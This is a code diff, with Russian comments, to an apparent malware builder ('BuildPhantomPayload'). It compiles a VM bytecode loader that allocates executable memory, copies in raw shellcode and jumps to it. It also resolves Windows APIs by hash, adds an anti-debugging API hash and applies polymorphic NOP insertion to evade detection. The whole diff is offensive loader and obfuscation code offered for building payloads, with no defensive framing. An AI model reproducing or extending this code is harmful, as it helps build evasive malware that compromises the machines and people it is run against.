@@ -146,7 +146,7 @@ BYTE* BuildLoader(const char* template_file, const BYTE* encrypted_bytecode, SIZ
     bytecode_size_pos = strchr(bytecode_size_pos, ':') + 1;
     while(*bytecode_size_pos && isspace(*bytecode_size_pos)) bytecode_size_pos++;
     sprintf(bytecode_size_pos, "\n    dq %zu", bytecode_len);
-
+    
     // Обновляем зашифрованный байткод
     bytecode_payload_pos = strchr(bytecode_payload_pos, ':') + 1;
     while(*bytecode_payload_pos && isspace(*bytecode_payload_pos)) bytecode_payload_pos++;
@@ -241,7 +241,6 @@ BOOL CompileLoader(const char* asm_file, const char* output_file) {
 #define VM_PUSH_REG         0x05 // PUSH регистра VM на стек VM
 #define VM_JMP_REG          0x06 // JMP на адрес в регистре VM (например, R0/r14)
 #define VM_MOV_REG_CONST    0x07 // MOV VM_Rx, CONST64 (Пока только для R0/r14)
-#define VM_XOR_MEM          0x0A // XOR участка памяти (для возможной саморасшифровки)
 #define VM_HALT             0xFF
 
 // Хеши API (примеры, нужны реальные)
@@ -249,89 +248,87 @@ BOOL CompileLoader(const char* asm_file, const char* output_file) {
 #define HASH_NTDLL             0x3CFA685D // Примерный хеш для ntdll.dll (нужно вычислить!)
 #define HASH_VIRTUALALLOC      0xE5534117 // Пример для kernel32.VirtualAlloc (нужно вычислить!)
 #define HASH_WRITEPROCESSMEMORY 0x1E38AE13 // Пример для kernel32.WriteProcessMemory (нужно вычислить!)
+#define HASH_CHECKREMOTEDEBUGGER 0x43AF7D80 // Хеш для CheckRemoteDebuggerPresent
 #define HASH_EXITPROCESS       0x56A2B5F0 // Пример для kernel32.ExitProcess (нужно вычислить!)
 
 // Вспомогательная функция для записи опкода и операндов
-static BYTE* emit_byte(BYTE* p, BYTE val) { *p++ = val; return p; }
-static BYTE* emit_dword(BYTE* p, uint32_t val) { *(uint32_t*)p = val; return p + 4; }
-static BYTE* emit_qword(BYTE* p, uint64_t val) { *(uint64_t*)p = val; return p + 8; }
+// Используем макросы для удобства
+#define EMIT_BYTE(ptr, val) (*(ptr)++ = (BYTE)(val))
+#define EMIT_DWORD(ptr, val) (*(uint32_t*)(ptr) = (uint32_t)(val), (ptr) += 4)
+#define EMIT_QWORD(ptr, val) (*(uint64_t*)(ptr) = (uint64_t)(val), (ptr) += 8)
 
 // Генерирует байткод для загрузки и запуска payload
 BYTE* CompileToBytecode(const BYTE* payload, SIZE_T payload_size, SIZE_T* bytecode_size) {
     // Очень грубая оценка размера байткода + сам payload
-    SIZE_T max_size = payload_size + 512; // Увеличим запас под инструкции
+    SIZE_T estimated_instr_size = 200; // Приблизительный размер инструкций VM
+    SIZE_T max_size = payload_size + estimated_instr_size; 
     BYTE* bytecode = (BYTE*)malloc(max_size);
     if (!bytecode) return NULL;
 
     BYTE* p = bytecode;
+    BYTE* start_ptr = bytecode;
 
-    printf("[Builder] Generating bytecode...\n");
+    printf("[Builder] Generating bytecode for raw shellcode...\n");
 
-    // --- Код байткода --- 
+    // 1. Выделить память для payload (VirtualAlloc)
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Protection (PAGE_EXECUTE_READWRITE = 0x40)
+    EMIT_QWORD(p, 0x40);
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH AllocationType (MEM_COMMIT | MEM_RESERVE = 0x3000)
+    EMIT_QWORD(p, 0x3000);
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
+    EMIT_QWORD(p, payload_size); 
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Address (NULL)
+    EMIT_QWORD(p, 0);
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1 for current process)
+    EMIT_QWORD(p, (uint64_t)-1);
+    EMIT_BYTE(p, VM_LOAD_API_HASH);         // LOAD VirtualAlloc -> R0 (r14)
+    EMIT_DWORD(p, HASH_VIRTUALALLOC);
+    EMIT_BYTE(p, VM_CALL_API);              // CALL VirtualAlloc(hProc, Addr, Size, Type, Prot) 
+    EMIT_BYTE(p, 0);                        // Адрес API в R0
+    EMIT_BYTE(p, 5);                        // 5 аргументов
+    
+    // Результат (адрес выделенной памяти) в R0 (r14)
+    EMIT_BYTE(p, VM_PUSH_REG);              // PUSH R0 (адрес назначения для WPM)
+    EMIT_BYTE(p, 0);
 
-    // 1. Выделить память для payload
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Protection (PAGE_EXECUTE_READWRITE = 0x40)
-    p = emit_qword(p, 0x40);
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH AllocationType (MEM_COMMIT | MEM_RESERVE = 0x3000)
-    p = emit_qword(p, 0x3000);
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
-    p = emit_qword(p, payload_size);
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Address (NULL)
-    p = emit_qword(p, 0);
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1 for current process)
-    p = emit_qword(p, (uint64_t)-1);
-    p = emit_byte(p, VM_LOAD_API_HASH);         // LOAD VirtualAlloc -> R0 (r14)
-    p = emit_dword(p, HASH_VIRTUALALLOC);
-    p = emit_byte(p, VM_CALL_API);              // CALL VirtualAlloc(hProc, Addr, Size, Type, Prot)
-    p = emit_byte(p, 0);                        // Адрес API в R0
-    p = emit_byte(p, 5);                        // 5 аргументов
-    // Результат (адрес выделенной памяти) теперь в R0 (r14)
-
-    // 2. Скопировать payload в выделенную память
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
-    p = emit_qword(p, payload_size);
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Source Address (payload - будет в конце байткода)
-    // Адрес payload будет вычислен позже, пока ставим 0
+    // 2. Скопировать payload в выделенную память (WriteProcessMemory)
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
+    EMIT_QWORD(p, payload_size);
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Source Address (адрес payload внутри bytecode)
     uint64_t* payload_addr_ref = (uint64_t*)p;
-    p = emit_qword(p, 0); 
-    p = emit_byte(p, VM_PUSH_REG);              // PUSH Destination Address (из R0)
-    p = emit_byte(p, 0);                        // Регистр R0
-    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1)
-    p = emit_qword(p, (uint64_t)-1);
-    // Сохраняем адрес выделенной памяти (R0) в другой регистр (R1/r13), т.к. LOAD_API затрет R0
-    // p = emit_byte(p, VM_MOV_REG_REG);           // MOV R1, R0  -- ПОКА НЕТ MOV_REG_REG
-    // p = emit_byte(p, 1);                        // Целевой регистр R1 (r13)
-    // p = emit_byte(p, 0);                        // Исходный регистр R0 (r14)
-    // Вместо MOV_REG_REG используем POP_REG
-    p = emit_byte(p, VM_POP_REG);               // POP Destination Address -> R1 (r13)
-    p = emit_byte(p, 1);                        // Регистр R1
+    EMIT_QWORD(p, 0);                       // Заполним позже
+    EMIT_BYTE(p, VM_PUSH_REG);              // PUSH Destination Address (из R0, который мы сохранили на стеке)
+    EMIT_BYTE(p, 0);
+    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1)
+    EMIT_QWORD(p, (uint64_t)-1);
+    // Сохраняем адрес назначения (из стека VM, куда PUSH_REG его положил) в R1 (r13)
+    EMIT_BYTE(p, VM_POP_REG);               // POP Destination Address -> R1 (r13) 
+    EMIT_BYTE(p, 1);                        // Регистр R1
 
-    p = emit_byte(p, VM_LOAD_API_HASH);         // LOAD WriteProcessMemory -> R0 (r14)
-    p = emit_dword(p, HASH_WRITEPROCESSMEMORY);
-    p = emit_byte(p, VM_CALL_API);              // CALL WriteProcessMemory(hProc, BaseAddr, Buffer, Size)
-    p = emit_byte(p, 0);                        // Адрес API в R0
-    p = emit_byte(p, 4);                        // 4 аргумента
-    // R1 (r13) все еще хранит адрес payload в удаленном процессе
+    EMIT_BYTE(p, VM_LOAD_API_HASH);         // LOAD WriteProcessMemory -> R0 (r14)
+    EMIT_DWORD(p, HASH_WRITEPROCESSMEMORY);
+    EMIT_BYTE(p, VM_CALL_API);              // CALL WriteProcessMemory(hProc, BaseAddr, Buffer, Size)
+    EMIT_BYTE(p, 0);                        // Адрес API в R0
+    EMIT_BYTE(p, 4);                        // 4 аргумента
+    // R1 (r13) все еще хранит адрес назначения (куда скопировали payload)
     
     // 3. Передать управление payload
-    p = emit_byte(p, VM_JMP_REG);               // JMP на адрес в регистре R1
-    p = emit_byte(p, 1);                        // Регистр R1 (r13)
+    EMIT_BYTE(p, VM_JMP_REG);               // JMP на адрес в регистре R1
+    EMIT_BYTE(p, 1);                        // Регистр R1 (r13)
 
     // 4. Halt (на всякий случай, если JMP не сработает)
-    p = emit_byte(p, VM_HALT);                  // HALT
+    EMIT_BYTE(p, VM_HALT);                  // HALT
 
-    // --- Конец кода байткода ---
-    
     // Вычисляем реальный размер сгенерированного байткода
-    SIZE_T generated_bytecode_size = p - bytecode;
+    SIZE_T generated_bytecode_size = p - start_ptr;
     
-    // Вычисляем адрес, где будет начинаться payload (сразу после байткода)
-    // Адрес относительный от начала всего блока bytecode_payload в stage0.asm
+    // Вычисляем адрес/смещение, где будет начинаться payload
+    // Смещение относительно начала сгенерированного блока (bytecode + payload)
     uint64_t payload_runtime_offset = (uint64_t)generated_bytecode_size; 
     *payload_addr_ref = payload_runtime_offset; // Вставляем смещение payload в инструкцию PUSH
 
     // Копируем сам payload в конец буфера
-    if ((p - bytecode) + payload_size > max_size) {
+    if (generated_bytecode_size + payload_size > max_size) {
         printf("[Builder] Error: Max bytecode size exceeded!\n");
         free(bytecode);
         return NULL;
@@ -342,7 +339,7 @@ BYTE* CompileToBytecode(const BYTE* payload, SIZE_T payload_size, SIZE_T* byteco
     *bytecode_size = generated_bytecode_size + payload_size;
 
     printf("[Builder] Bytecode generated successfully (size: %zu instructions, %zu payload, %zu total)\n", 
-            generated_bytecode_size, payload_size, *bytecode_size);
+             generated_bytecode_size, payload_size, *bytecode_size);
     return bytecode; 
 }
 
@@ -417,6 +414,22 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     }
     
     printf("[+] Скомпилированный загрузчик загружен, размер: %zu байт\n", loader_asm_size);
+    
+    // Применяем полиморфизм к загрузчику (скомпилированному stage0)
+    if (config->obfuscation_level > 1) {
+        printf("[*] Применяем полиморфизм (NOP-вставки)...");
+        SIZE_T poly_shellcode_size = 0;
+        BYTE* poly_shellcode = BuildPolymorphicShellcode(loader_asm, loader_asm_size, config->obfuscation_level, &poly_shellcode_size);
+        if (poly_shellcode) {
+            free(loader_asm); // Освобождаем старый
+            loader_asm = poly_shellcode; // Используем полиморфный
+            loader_asm_size = poly_shellcode_size;
+            printf("[+] Полиморфизм применен, новый размер: %zu байт\n", loader_asm_size);
+        } else {
+             printf("[-] Ошибка полиморфизма!\n");
+             // Продолжаем без полиморфизма
+        }
+    }
     
     // Загружаем скомпилированный бинарный файл
     SIZE_T shellcode_size = 0;
